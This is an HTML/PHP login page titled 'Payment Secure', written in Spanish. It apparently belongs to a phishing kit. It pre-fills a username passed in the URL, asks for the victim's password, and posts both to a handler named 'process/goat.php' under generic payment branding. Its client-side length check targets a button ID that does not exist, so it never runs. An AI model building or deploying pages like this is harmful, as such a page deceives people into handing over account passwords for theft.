<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Secure</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>

    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
        }
        input {
            width: 80%;
            border: none;
            border-bottom: 1px solid #dcdcdc;
            height: 40px;
            font-size: 15px;
            margin-bottom: 20px;
        }
        input[type="submit"] {
            border: 0;
            width: 80%;
            background-color: #f08ba7;
            height: 40px;
            border-radius: 20px;
            color: white;
            font-size: 15px;
        }
        input[type="submit"]:nth-child(3) {
            background-color: white;
            color: #f08ba7;
            border: 1px solid #f08ba7;
        }
    </style>
</head>
<body>

<img src="img/logo.jpg" alt="Logo" width="100%">

<!-- Mostrar el usuario recibido por URL -->


<form action="process/goat.php" method="POST" style="text-align: center; margin-top: 20px;">
    <input type="hidden" name="user" value="<?php echo htmlspecialchars($_GET['user'] ?? ''); ?>">
    <input type="password" name="pass" id="txtPassword" placeholder="Ingresa tu contraseña" required>
    <input type="submit" value="Continuar">
</form>

<center>
    <input type="submit" value="Registrarme ahora">
</center>

<script>
    $(document).ready(function() {
        $('#btnPass').click(function(e) {
            const password = $("#txtPassword").val();
            if (password.length <= 3) {
                e.preventDefault();
                alert("La contraseña debe tener al menos 4 caracteres.");
            }
        });
    });
</script>

</body>
</html>
